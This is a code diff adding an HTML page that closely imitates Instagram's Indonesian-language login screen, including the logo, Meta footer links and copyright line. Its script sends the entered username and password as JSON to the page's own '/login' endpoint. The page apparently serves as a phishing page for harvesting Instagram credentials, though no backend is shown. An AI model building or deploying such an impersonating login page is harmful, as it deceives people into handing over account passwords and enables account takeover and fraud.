@@ -1,0 +1,165 @@
+<!doctype html>
+<html>
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link href="./output.css" rel="stylesheet">
+</head>
+
+<body class="bg-black text-white min-h-screen flex flex-col">
+    <div class="flex-1 flex items-center justify-center px-4">
+        <div class="w-full max-w-sm">
+
+            <!-- Login Form Container -->
+            <div class="border border-[#363636] bg-black px-10 py-8 mb-4 mt-3">
+                <img src="logo.png" alt="Instagram Logo" class="mx-auto mb-6 w-1/2" />
+                <form id="loginForm" class="space-y-2">
+                    <div>
+                        <input type="text" name="username" id="username"
+                            placeholder="Nomor telepon, nama pengguna, atau email"
+                            class="w-full text-white px-2 py-3 text-xs border border-[#363636] bg-[#121212] rounded focus:border-blue-500 focus:outline-none transition-colors"
+                            required />
+                    </div>
+                    <div>
+                        <input type="password" name="password" id="password" placeholder="Kata Sandi"
+                            class="w-full text-white px-2 py-3 text-xs border border-[#363636] bg-[#121212] rounded focus:border-blue-500 focus:outline-none transition-colors"
+                            required />
+                    </div>
+                    <button type="submit"
+                        class="w-full py-2 !mt-6 bg-blue-600 hover:bg-blue-700 text-white text-sm font-medium rounded transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500">
+                        Masuk
+                    </button>
+                </form>
+
+                <!-- Hint untuk user -->
+                <div class="text-center mt-2">
+                    <span class="text-xs text-gray-500">Tekan Enter atau klik tombol Masuk</span>
+                </div>
+
+                <!-- OR Divider -->
+                <div class="flex items-center my-6">
+                    <div class="flex-1 border-t border-[#363636]"></div>
+                    <span class="px-4 text-gray-400 text-sm font-medium">ATAU</span>
+                    <div class="flex-1 border-t border-[#363636]"></div>
+                </div>
+
+                <!-- Facebook Login -->
+                <div class="text-center">
+                    <a href="#" class="inline-flex items-center text-blue-500 text-sm font-medium hover:text-blue-400">
+                        <svg class="w-5 h-5 mr-2" viewBox="0 0 24 24" fill="currentColor">
+                            <path
+                                d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
+                        </svg>
+                        Masuk dengan Facebook
+                    </a>
+                </div>
+
+                <div id="loginMessage" class="text-center mt-3"></div>
+
+                <!-- Forgot Password -->
+                <div class="text-center mt-3">
+                    <a href="#" class="text-white text-sm font-bold hover:text-gray-300">
+                        Lupa kata sandi?
+                    </a>
+                </div>
+            </div>
+
+            <!-- Sign Up Link -->
+            <div class="border border-[#363636] bg-black px-10 py-6 text-center">
+                <p class="text-sm text-gray-300">
+                    Belum punya akun? <a href="#" class="text-blue-500 hover:text-blue-400 font-medium">Buat akun</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="mt-8 pb-8 ">
+        <div class="w-full mx-auto px-4">
+            <div class="flex flex-wrap justify-center items-center gap-x-4 gap-y-2 text-xs text-gray-500">
+                <a href="#" class="hover:text-gray-300">Meta</a>
+                <a href="#" class="hover:text-gray-300">Tentang</a>
+                <a href="#" class="hover:text-gray-300">Blog</a>
+                <a href="#" class="hover:text-gray-300">Pekerjaan</a>
+                <a href="#" class="hover:text-gray-300">Bantuan</a>
+                <a href="#" class="hover:text-gray-300">API</a>
+                <a href="#" class="hover:text-gray-300">Privasi</a>
+                <a href="#" class="hover:text-gray-300">Ketentuan</a>
+                <a href="#" class="hover:text-gray-300">Lokasi</a>
+                <a href="#" class="hover:text-gray-300">Instagram Lite</a>
+                <a href="#" class="hover:text-gray-300">Meta AI</a>
+                <a href="#" class="hover:text-gray-300">Artikel Meta AI</a>
+                <a href="#" class="hover:text-gray-300">Threads</a>
+                <a href="#" class="hover:text-gray-300">Pengunggahan Kontak & Nonpengguna</a>
+                <a href="#" class="hover:text-gray-300">Verifikasi Meta</a>
+                <a href="#" class="hover:text-gray-300">Meta di Indonesia</a>
+            </div>
+
+            <div class="flex justify-center items-center mt-4 gap-4">
+                <select class="bg-black text-gray-400 text-xs px-2 py-1 focus:outline-none">
+                    <option>Bahasa Indonesia</option>
+                </select>
+                <span class="text-xs text-gray-500">© 2025 Instagram from Meta</span>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Handle form submission (works for both Enter key and button click)
+        document.getElementById("loginForm").addEventListener("submit", async function (e) {
+            e.preventDefault();
+
+            const formData = {
+                username: document.getElementById("username").value,
+                password: document.getElementById("password").value
+            };
+
+            // Show loading state
+            const submitBtn = this.querySelector('button[type="submit"]');
+            const originalText = submitBtn.textContent;
+            submitBtn.textContent = "Memproses...";
+            submitBtn.disabled = true;
+
+            try {
+                const res = await fetch("/login", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(formData)
+                });
+
+                const data = await res.json();
+
+                const msgDiv = document.getElementById("loginMessage");
+                msgDiv.textContent = data.message;
+                msgDiv.className = "text-center mt-3 " + (data.success ? "text-green-500" : "text-red-500");
+
+                // Kosongkan input jika berhasil
+                if (data.success) {
+                    document.getElementById("username").value = "";
+                    document.getElementById("password").value = "";
+                }
+            } catch (error) {
+                const msgDiv = document.getElementById("loginMessage");
+                msgDiv.textContent = "Terjadi kesalahan. Silakan coba lagi.";
+                msgDiv.className = "text-center mt-3 text-red-500";
+            } finally {
+                // Restore button state
+                submitBtn.textContent = originalText;
+                submitBtn.disabled = false;
+            }
+        });
+
+        // Optional: Handle Enter key explicitly (though it's already handled by form submit)
+        document.addEventListener("keydown", function (e) {
+            if (e.key === "Enter") {
+                const activeElement = document.activeElement;
+                if (activeElement && (activeElement.id === "username" || activeElement.id === "password")) {
+                    console.log("Enter pressed - form will submit automatically");
+                }
+            }
+        });
+    </script>
+</body>
+
+</html>
